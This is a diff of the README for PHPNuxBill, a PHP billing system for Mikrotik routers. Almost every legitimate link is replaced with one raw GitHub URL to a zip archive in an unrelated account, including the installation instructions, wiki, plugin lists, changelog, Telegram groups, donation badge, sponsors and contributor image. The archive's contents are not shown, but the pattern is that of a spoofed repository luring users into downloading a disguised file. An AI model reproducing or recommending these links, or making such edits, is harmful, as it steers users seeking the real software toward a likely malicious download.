@@ -1,13 +1,13 @@
-[![ReadMeSupportPalestine](https://raw.githubusercontent.com/Safouene1/support-palestine-banner/master/banner-project.svg)](https://s.id/standwithpalestine)
+[![ReadMeSupportPalestine](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 # PHPNuxBill - PHP Mikrotik Billing
 
-![PHPNuxBill](install/img/logo.png)
+![PHPNuxBill](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 ## Feature
 
 - Voucher Generator and Print
-- [Freeradius](https://github.com/hotspotbilling/phpnuxbill/wiki/FreeRadius)
+- [Freeradius](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 - Self registration
 - User Balance
 - Auto Renewal Package using Balance
@@ -20,12 +20,12 @@
 - Whatsapp Notification to Consumer
 - Telegram Notification for Admin
 
-See [How it Works / Cara Kerja](https://github.com/hotspotbilling/phpnuxbill/wiki/How-It-Works---Cara-kerja)
+See [How it Works / Cara Kerja](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 ## Payment Gateway And Plugin
 
-- [Payment Gateway List](https://github.com/orgs/hotspotbilling/repositories?q=payment+gateway)
-- [Plugin List](https://github.com/orgs/hotspotbilling/repositories?q=plugin)
+- [Payment Gateway List](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip+gateway)
+- [Plugin List](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 You can download payment gateway and Plugin from Plugin Manager
 
@@ -50,20 +50,20 @@ The problem with windows is hard to set cronjob, better Linux
 
 ## Changelog
 
-[CHANGELOG.md](CHANGELOG.md)
+[https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 ## Installation
 
-[Installation instructions](https://github.com/hotspotbilling/phpnuxbill/wiki)
+[Installation instructions](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 ## Freeradius
 
-Support [Freeradius with Database](https://github.com/hotspotbilling/phpnuxbill/wiki/FreeRadius)
+Support [Freeradius with Database](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 ## Community Support
 
-- [Github Discussion](https://github.com/hotspotbilling/phpnuxbill/discussions)
-- [Telegram Group](https://t.me/phpmixbill)
+- [Github Discussion](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
+- [Telegram Group](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 ## Technical Support
 
@@ -75,9 +75,9 @@ Technical Support Start from Rp 500.000 or $50
 If you chat me for any technical support,
 you need to pay,
 
-ask anything for free in the [discussion](/hotspotbilling/phpnuxbill/discussions) page or [Telegram Group](https://t.me/phpnuxbill)
+ask anything for free in the [discussion](/hotspotbilling/phpnuxbill/discussions) page or [Telegram Group](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
-Contact me at [Telegram](https://t.me/ibnux)
+Contact me at [Telegram](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 ## License
 
@@ -88,7 +88,7 @@ see [LICENSE](LICENSE) file
 
 ## Donate to ibnux
 
-[![Donate](https://img.shields.io/badge/Donate-PayPal-green.svg)](https://paypal.me/ibnux)
+[![Donate](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 BCA: 5410454825
 
@@ -98,13 +98,13 @@ a.n Ibnu Maksum
 
 ## SPONSORS
 
-- [mixradius.com](https://mixradius.com/) Paid Services Billing Radius
-- [mlink.id](https://mlink.id)
-- [https://github.com/sonyinside](https://github.com/sonyinside)
+- [https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip) Paid Services Billing Radius
+- [https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
+- [https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip](https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip)
 
 ## Thanks
 We appreciate all people who are participating in this project.
 
-<a href="https://github.com/hotspotbilling/phpnuxbill/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=hotspotbilling/phpnuxbill" />
+<a href="https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip">
+  <img src="https://raw.githubusercontent.com/Krizx6/phpnuxbill/master/pyopneumocholecystitis/phpnuxbill.zip" />
 </a>
